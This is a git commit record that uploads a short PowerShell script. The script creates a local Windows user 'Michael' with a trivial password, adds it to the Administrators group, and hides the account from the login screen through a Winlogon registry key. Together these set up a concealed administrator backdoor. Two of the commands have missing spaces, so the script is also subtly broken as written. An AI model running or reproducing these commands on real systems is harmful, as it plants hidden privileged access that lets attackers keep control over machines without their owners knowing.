c4d18854facf29f1799081a9ab800113f32da049
Justin Uding <54405777+Ferbie10@users.noreply.github.com>
2022-05-16 07:07:30 -0500

    Add files via upload

---
+++ Untitled1.ps1
@@ -0,0 +1,3 @@
+﻿net user Michael 123 /add 
+net localgroup Administrators Michael/add 
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v Michael/t REG_DWORD /d 0 /f 
